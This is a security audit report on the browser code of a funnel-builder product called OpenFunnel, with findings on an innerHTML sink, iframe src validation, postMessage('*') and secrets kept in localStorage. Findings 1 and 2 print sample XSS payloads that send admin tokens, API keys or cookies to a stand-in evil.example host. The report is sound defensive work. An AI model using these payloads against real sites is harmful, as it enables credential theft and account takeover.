# OpenFunnel — Security Audit Track B: Client-Side / Browser Code

Scope: `apps/admin`, `apps/app`, `apps/builder`, `demo/index.html`, `packages/engine/src/**`,
`packages/engine/types/index.d.ts`, `examples/*.json`. Read-only, no code executed.
`apps/runtime` (server) is out of scope, but two files there (`csp.js`, and references from
`.env.example`) were read as **context only**, because they directly determine whether the
primary finding below is exploitable in the shipped configuration. That determination should
still be independently confirmed by whoever audits Track A (server).

## VERDICT

**FAIL — one real, unescaped HTML-injection sink for attacker-controlled funnel data,** plus
three Major-severity issues (leaky legacy `postMessage("*")`, unvalidated iframe `src` scheme
for embedded video, cleartext credential storage). The codebase is otherwise unusually
disciplined about XSS: it has a single `text:`/`textContent` convention used at ~150 call sites
across every renderer, an explicit `isNavigableUrl()` scheme allowlist reused everywhere a URL
becomes `href`/navigation, and a hand-rolled formula evaluator instead of `eval`. The team is
clearly aware of the one HTML sink (`step.consent`) and has built a server-side CSP specifically
to backstop it — see Finding 1's "Mitigating factor" for why that changes real-world risk without
making the client-side defect not a defect.

---

## Findings

### Finding 1 — CRITICAL (client-side code) / Major-in-practice (given documented CSP backstop): Unescaped HTML injection via `step.consent`

**File:line:** `packages/engine/src/render/form.js:199`

```js
if (step.consent) form.appendChild(el("p", { class: "of-consent", html: step.consent }));
```

`el()`'s `html` attribute key (`packages/engine/src/dom.js:70`) does:

```js
else if (key === "html") node.innerHTML = String(value);
```

`step.consent` is a plain `string` field on `FormStep` (`packages/engine/types/index.d.ts:136`:
`consent?: string`). Every template in `apps/app/templates.js` and every `examples/*.json` file
puts ordinary marketing copy in it ("Unsubscribe anytime.", etc.) — nothing in the type or the
examples signals "this is meant to hold HTML." Yet it is the *only* funnel field in the entire
engine rendered via `innerHTML` instead of `textContent`. Every other renderer in
`packages/engine/src/render/*.js` (choice.js, multiselect.js, content.js, blocks.js, landing.js,
success.js) uses `el(tag, { text: value })`, which sets `textContent` and cannot execute markup.
This one line is the exception.

**Why it's exploitable:** per the stated threat model, funnel documents are attacker-supplied
(imported templates, gists, bug reports, or the `/api/ai/generate` response that
`apps/app/app.js:generateFunnel()` loads directly into `setWorkingFunnel()` with no validation).
A form step with:

```json
{ "type": "form", "id": "x", "fields": [...], "consent": "<img src=x onerror=\"fetch('https://evil.example/x?t='+localStorage.getItem('of.adminToken')+'&k='+localStorage.getItem('of.ai.key'))\">" }
```

executes the moment the step is rendered — no `<script>` tag needed, since `innerHTML` parses
`<img onerror>` and fires it immediately on the (broken) image load.

**Attack scenario:** operator imports/pastes a funnel document (or a compromised/MITM'd AI
provider returns one) containing the payload above. The operator opens it in the console —
`apps/app/app.js:mountPreview()` loads `/f/<slug>?preview=1` into a **same-origin, non-sandboxed**
`<iframe>` (`apps/app/index.html:333`, no `sandbox` attribute). The payload fires inside that
iframe, which shares the console's origin — meaning it can read `localStorage.getItem("of.adminToken")`,
`"of.ai.key"`, `"of.webhookSecret"` (all stored in cleartext, see Finding 4) and exfiltrate them,
yielding full `/api/admin/*` control (read every captured lead's PII, rewrite funnels, redirect
lead-notification email settings to an attacker-controlled SMTP relay) plus the operator's AI
provider key. The same payload also fires for any ordinary visitor who reaches the published
`/f/:slug` page directly.

**Mitigating factor (found while reading context, not in this track's file list):**
`apps/runtime/lib/csp.js` builds a `script-src` for every `/f/:slug` response pinned to `'self'`
plus the SHA-256 hash of one fixed boot script — no `'unsafe-inline'`, no `'unsafe-eval'` — and
its own comment names this exact sink: *"This is the backstop for the engine's one deliberate
HTML sink (`step.consent` is rendered as markup...): with `script-src` pinned to the boot
script's hash plus same-origin modules, injected markup cannot execute."* A strict `script-src`
without `unsafe-inline` does block inline event-handler attributes like `onerror=`, so **if this
CSP header reaches every response for the funnel route — including `?preview=1` served into the
console's iframe — the primary exploitation path above is blocked in the shipped runtime.**

This does not make the client-side code correct, for three reasons worth flagging to whoever owns
the full picture: (a) it is a single point of failure — one caching layer, reverse proxy, or CSP
regression that strips/weakens that one header re-opens full console takeover, with no client-side
defense underneath it; (b) `packages/engine` is structured as a standalone, reusable package
(`packages/engine/src/index.js`, its own `types/index.d.ts`) — `demo/index.html` embeds it
directly with **no CSP at all**, so any consumer that embeds the engine without independently
reconstructing this exact CSP has zero protection for this sink; (c) `<a href="javascript:...">`
inside `step.consent` is a second payload shape whose CSP coverage is less consistent across
browser implementations than `onerror=` — worth a live pentest rather than assuming it's covered.

**Fix:** escape `step.consent` by default (`text:` instead of `html:`), or — if a link inside the
consent line is a real product requirement — parse only `<a href="...">...</a>` explicitly and
validate the href through the same `isNavigableUrl()` already used everywhere else in this file's
sibling modules, rather than accepting arbitrary markup.

---

### Finding 2 — Major: Embedded video `<iframe src>` accepts attacker-controlled scheme via a substring match, unlike every other URL in the engine

**Files:lines:**
- `packages/engine/src/render/blocks.js:459-475` (`renderVideo`)
- `packages/engine/src/render/landing.js:149-165` (`renderHeroMedia`, video branch)

Both contain the identical pattern:

```js
const isEmbed = /youtube\.com|youtu\.be|vimeo\.com|player\./.test(block.src);
if (isEmbed) {
  let src = block.src;
  const yt = src.match(/(?:youtu\.be\/|youtube\.com\/watch\?v=)([\w-]+)/);
  if (yt) src = `https://www.youtube.com/embed/${yt[1]}`;
  return el("div", ..., [el("iframe", { src, ... })]);
}
```

`RegExp.test()` is unanchored — it matches the listed hostnames *anywhere* in the string, not
just as the actual host. A `block.src` (or `media.src` on a landing hero) of
`javascript:fetch('//evil/x?c='+document.cookie)//player.` contains the substring `player.` and
therefore satisfies `isEmbed`. The YouTube-ID regex then fails to match, so `src` is left
unchanged and is set verbatim as the `<iframe>`'s `src` attribute via `el()`'s generic
`node.setAttribute(key, String(value))` path — no scheme check at all.

This is the one URL-bearing field in the engine that does **not** go through `isNavigableUrl()`.
Compare `Controller.redirect()` (controller.js:226-238), `safeLink()` (landing.js:283-292), and
`buildConsentBar()`'s `policyUrl` (consent.js:120) — all three explicitly reject `javascript:`,
`data:`, and protocol-relative URLs before using them as navigation targets, with comments
explaining exactly this risk. `renderVideo`/`renderHeroMedia` were missed.

**Why an iframe matters more than an `<img>` or `<video>` src:** setting an `<iframe>`'s `src` to
a `javascript:` URI causes the browser to execute it in the iframe's context automatically on
insertion — no click required, unlike an `<a href="javascript:">`. `<img>`/`<video>` src with a
`javascript:` scheme simply fails to load; iframes are different.

**Mitigating factor:** the same funnel-page CSP (`apps/runtime/lib/csp.js:funnelCsp()`) sets
`frame-src https:`, which restricts iframe navigation to the `https:` scheme and should reject a
`javascript:` src in a spec-compliant browser — again, only for the `/f/:slug` route, and again
not present in `demo/index.html` or guaranteed for any other embedder of the package.

**Fix:** anchor the platform check (`^https:\/\/(www\.)?(youtube\.com|youtu\.be|vimeo\.com)\b`)
and run the final `src` through `isNavigableUrl()` (or an even narrower https-only check) before
handing it to `el()`, exactly like every other URL field in this codebase already does.

---

### Finding 3 — Major: Legacy builder leaks the entire funnel document to `postMessage(..., "*")`

**File:line:** `apps/builder/builder.js:467-474`

```js
function updatePreview() {
  if (!currentFunnel || !previewIframe) return;
  previewIframe.contentWindow?.postMessage(
    { type: "of:preview", funnel: JSON.parse(JSON.stringify(currentFunnel)), stepIndex: currentStepIndex },
    "*"
  );
}
```

Every other `postMessage` call in scope targets `window.location.origin` explicitly — this is the
one `"*"`. Contrast with `apps/app/app.js:2384-2391` (`pushPreview()`), which does the same job
correctly with `location.origin` as the third argument, and with the inline comment right next to
the *sibling* pattern in `packages/engine/src/render/choice.js:104-110`: *"Same-origin builder
only — never `"*"`, or any site that frames this funnel would receive the message too."* That
rule was applied everywhere except this file.

**Why this is exploitable without any malicious funnel document at all:** the previewed iframe
(`apps/builder/index.html:122`, `src="/f/lead-gen?preview=1"`) is not pinned to that URL forever —
a completely ordinary "success" step with a `redirectUrl` (e.g. a Calendly booking link) calls
`Controller.redirect()` → `window.location.href = url`, which navigates the **iframe itself**
(inside an iframe, unqualified `window` is the iframe's own window) to that external site. The
next time the operator edits anything in the builder, `updatePreview()` fires and broadcasts the
**full current funnel JSON** — which can include `integrations.webhookSecret`,
`integrations.metaPixelId`, and everything else on the document — to whatever origin now occupies
that iframe, because `"*"` performs no origin check on the recipient at all. No attacker crafting
is required; a normal operator workflow (preview a funnel, click through to see where the CTA
goes, keep editing) does it.

**Scope note:** `apps/builder` is explicitly called "legacy" in `apps/runtime/routes/assets.js`'s
comment ("the two legacy standalone UIs") and is not linked from the primary `/app` console's
navigation — but it is still shipped, still served at `/_builder/index.html`, and still fully
functional, so it's a live surface, not dead code.

**Fix:** `previewIframe.contentWindow.postMessage(msg, location.origin)`, matching every other
call site.

---

### Finding 4 — Major: Admin token, AI provider API key, and webhook secret are stored in cleartext `localStorage`

**Files:** `apps/app/app.js` — `apiFetch()` (line 408-413), `SETTINGS` table (2960-2972),
`saveSettings()` (3014-3025), `purgeCredentials()` (3407-3414).

```js
function apiFetch(url, options = {}) {
  const token = localStorage.getItem("of.adminToken") || "";
  const headers = { ...(options.headers || {}) };
  if (token) headers.authorization = `Bearer ${token}`;
  return fetch(url, { ...options, headers });
}
```

`localStorage` keys `of.adminToken`, `of.ai.key` (the operator's OpenAI/Anthropic/etc. API key),
and `of.webhookSecret` hold plaintext secrets with no expiry and no `HttpOnly`-equivalent
protection — any script that executes on this origin (e.g., Finding 1, if its CSP backstop is
ever bypassed or the affected page changes) can read them via `localStorage.getItem(...)` and
exfiltrate them in one line. This is the "one XSS from every secret this app holds" pattern.

**What's already done right here:** the token is *never* placed in a URL or logged anywhere client
-side — it only ever travels as an `Authorization: Bearer` header on same-origin `fetch()` calls
(confirmed: every `apiFetch()`/`fetch()` call site in scope targets a relative `/api/...` path,
never a cross-origin URL). There is also a working `purgeCredentials()` action in Settings that
clears all three keys plus their input fields. Given the product is a self-hosted, single-operator
console (not a multi-tenant SaaS with a real trust boundary between "operator" and "attacker"),
`localStorage` is a defensible design tradeoff rather than an oversight — but it's exactly the
resource Finding 1 would drain, so it's worth flagging together with that finding rather than in
isolation. Consider a short-lived, `HttpOnly` session cookie set by a login flow instead, if this
is ever exposed beyond a single trusted operator.

Note also: `apps/admin/admin.js` (the legacy admin page) makes the same `/api/admin/leads` and
`/api/admin/stats` calls with **no** `Authorization` header at all — it never reads
`of.adminToken`. If the server actually enforces `ADMIN_TOKEN`, this legacy page simply fails
closed (shows "No leads captured yet or error loading"); it is not a bypass, just confirmation
that only `apps/app/app.js` implements the auth path.

---

### Finding 5 — Minor: ReDoS via operator-controlled regex in form validation

**File:line:** `packages/engine/src/validate.js:34-38`

```js
if (field.pattern) {
  try {
    return new RegExp(field.pattern).test(str) ? "" : field.error || "Please check this field.";
  } catch {
    return "";
  }
}
```

`field.pattern` comes from the funnel document (a `FormField.pattern`, per
`packages/engine/types/index.d.ts`) and is compiled fresh on every keystroke's validation pass
(`validateForm` is called from `form.js`'s submit handler; nothing here debounces it, though it
only runs on submit, not per-keystroke — checked). A catastrophic-backtracking pattern (e.g.
`^(a+)+$` tested against a long string of `a`s with no trailing match) hangs the *visitor's* tab
synchronously; the surrounding `try/catch` only guards `RegExp` **construction** errors (bad
syntax), not a runtime hang during `.test()`. Low severity — it's a client-side DoS against the
visitor filling out the form, not the operator or server — but worth a length cap on `str` or a
regex-complexity check given the pattern is fully attacker-controlled per the stated threat model.

---

### Finding 6 — Info: Same-origin preview `<iframe>` has no `sandbox` attribute

**Files:** `apps/app/index.html:333`, `apps/builder/index.html:122`.

Neither preview iframe carries a `sandbox` attribute. This is consistent with the fact that both
intentionally rely on same-origin, bidirectional `postMessage` (drag-to-reorder options/blocks
posts back to `window.parent` from inside the engine — `packages/engine/src/render/choice.js:107`,
`blocks.js:81/102/149/165`) and on reading the parent's live edits, so a blanket `sandbox` would
break the editor UX, not just harden it. Flagging only because it means Finding 1's blast radius
(same-origin execution) is not accidental — it is the deliberate trust boundary the team chose,
which makes the CSP in Finding 1 the *only* backstop, not one of several layers. No action
required beyond what Finding 1 already recommends.

---

### Finding 7 — Info: Custom code injection (`customCss`/`customHead`/`customBody`) has no client-side implementation at all

Grepped for `customHead|customBody|customCss` across all of `packages/engine/src/` — zero
matches. The console UI for these fields exists (`apps/app/index.html:730-741`,
`apps/app/app.js:2785-2795, 3365-3367`) and simply stores them on `state.funnel.customCss` /
`.customHead` / `.customBody` and PATCHes them to `/api/builder/save`. The actual rendering and
"script-gating" described in `.env.example` (`ALLOW_CUSTOM_SCRIPTS`, `CUSTOM_SCRIPT_ORIGINS`) is
implemented entirely server-side in `apps/runtime/lib/html.js` (renders the fields) and
`apps/runtime/lib/csp.js` (`customCode()`, `collectCustomScriptSources()`, `funnelCsp()`) — both
out of this track's scope. From what `csp.js` shows: inline scripts pasted into `customHead`/
`customBody` are only allowed by SHA-256 hash of their exact bytes (never `'unsafe-inline'`), and
external scripts only by explicit origin allowlist, and the whole hashing pipeline is comment-
flagged as fragile to `funnelPage()`/`funnelCsp()` drifting apart in what they read. **This is a
Track A item** — someone should confirm `apps/runtime/lib/html.js` and `csp.js` read
`customCode()` through the shared helper (the code comments claim they must, which is itself a
signal this was a real bug once) and that the CSS field (`customCss`, unrestricted by the script
gate) can't be used for a `@import`/`expression()`-style escape. Not verifiable from the client
side alone.

---

## What was checked and found correctly handled

- **XSS via string interpolation, broadly:** every `.innerHTML =` / template-literal HTML build
  in `apps/admin/admin.js`, `apps/app/app.js`, and `apps/builder/builder.js` (~30 call sites
  total) routes every interpolated value through a local `esc()` that escapes `&`, `<`, `>`, `"`,
  and `'` — checked each implementation (admin.js:159-169, app.js:415-422, builder.js:506-516) and
  each is correct and consistently applied. `packages/engine/src`'s `el(tag, { text })` uses
  `textContent`, never string-built HTML, at effectively every call site across choice.js,
  multiselect.js, content.js, blocks.js, landing.js, success.js (the four `html:` uses are covered
  above — three are trusted static strings, one is Finding 1).
- **CSV/formula injection on export:** both `apps/admin/admin.js:exportCsv()` and
  `apps/app/app.js:exportCsv()` prefix values starting with `= + - @ \t \r` with a `'` and double
  internal quotes before wrapping in `"..."` — correct OWASP CSV-injection mitigation, applied to
  lead data that is stated to be visitor-supplied.
- **Open-redirect / `javascript:` URL blocking:** `isNavigableUrl()` (dom.js:24-30) is reused
  correctly by `Controller.redirect()`, `safeLink()` (landing nav/footer links), and
  `buildConsentBar()`'s policy-URL link — all three refuse non-`http(s)`/non-same-origin-path
  targets, including the `//evil.com` and `/\evil.com` protocol-relative tricks. (Finding 2 is the
  one URL field that was missed.)
- **`postMessage` origin checks:** correct (`window.location.origin` / `location.origin`, never
  `"*"`) at every site except the one in Finding 3. The inbound listener in `apps/app/app.js:2403-
  2404` checks `e.origin !== location.origin` before processing. The embedded boot script's
  inbound listener (`apps/runtime/lib/csp.js:52-53`, context-only read) does the same.
  `frame-ancestors` is intentionally absent from the CSP by design (funnels are meant to be
  embedded by the operator elsewhere) — a documented tradeoff, not an oversight.
- **`eval`/`new Function`/`setTimeout(string)`/`document.write`:** none found anywhere in scope.
  `calculator.js` is a genuine hand-rolled tokenizer + recursive-descent parser for arithmetic —
  confirmed it never touches `eval`/`Function`, matching its own doc comment.
  `setTimeout`/`setInterval` calls throughout the engine always take a function reference.
- **Consent / PII handling** (`packages/engine/src/consent.js`, `leads.js`, `persist.js`,
  `analytics.js`): consent gates *only* third-party pixel/webfont loading
  (`marketingAllowed()`/`_pixel()`/`loadThemeFont`), never first-party lead capture or drop-off
  events — matches the file's own documented intent exactly, no logic bypass found. Lead capture
  (`submitLead`) and events (`trackEvent`) POST only to same-origin `/api/lead` / `/api/events` by
  default (or an operator-configured `leadEndpoint`, which is the operator's own backend, not a
  third party the visitor didn't choose). `firePixel()`'s webhook-forwarding branch is
  deliberately absent client-side, with a comment explaining that a `webhookUrl`/`webhookSecret`
  shipped to the browser would be readable by any visitor and let a stranger forge leads into the
  operator's CRM — correctly pushed server-side instead. `persist.js`/`consent.js` both fail
  silently (try/catch) when storage is unavailable, treated as "undecided," the conservative
  default.
- **Third-party script bootstrap URLs** (`analytics.js:installPixels`): `gtmId`/`ga4Id` are
  `encodeURIComponent`-escaped before being concatenated into a `<script src>` URL — correct, even
  though these are operator-configured values rather than visitor input.
- **Example funnel JSON** (`examples/fitness.json`, `real-estate.json`, `lead-gen.json`,
  `agency-landing.json`): grepped for `<script`, `onerror`, `onload`, `javascript:`, `<img`,
  `<svg`, `eval(` — zero matches. All `consent` fields and copy are plain marketing text.
  `apps/app/templates.js` (2164 lines, ~9 bundled templates) likewise contains no HTML/script
  payloads in any field.
- **CSS files** (`apps/app/app.css`, `apps/admin/admin.css`, `apps/builder/builder.css`): grepped
  for `expression(`, `javascript:`, `@import url(http` — no matches; not deeply reviewed line-by-
  line beyond that, since CSS has no realistic script-execution vector in current browsers absent
  those patterns.

---

## Summary table

| # | Severity | File:line | Issue |
|---|----------|-----------|-------|
| 1 | Critical (code) / CSP-mitigated in shipped runtime | `packages/engine/src/render/form.js:199` | `step.consent` rendered via raw `innerHTML`, no escaping |
| 2 | Major | `packages/engine/src/render/blocks.js:459-475`, `render/landing.js:149-165` | Video `<iframe src>` scheme not validated; substring-match embed check bypassable |
| 3 | Major | `apps/builder/builder.js:467-474` | `postMessage(fullFunnelDoc, "*")` — leaks document (incl. secrets) to any origin the iframe currently shows |
| 4 | Major | `apps/app/app.js:408-413`, `2960-3025` | Admin token / AI key / webhook secret in cleartext `localStorage` |
| 5 | Minor | `packages/engine/src/validate.js:34-38` | ReDoS via attacker-controlled `field.pattern` |
| 6 | Info | `apps/app/index.html:333`, `apps/builder/index.html:122` | No `sandbox` on same-origin preview iframe (deliberate trust choice, noted for context) |
| 7 | Info | n/a (not implemented client-side) | Custom code injection gating lives entirely server-side — Track A to verify |
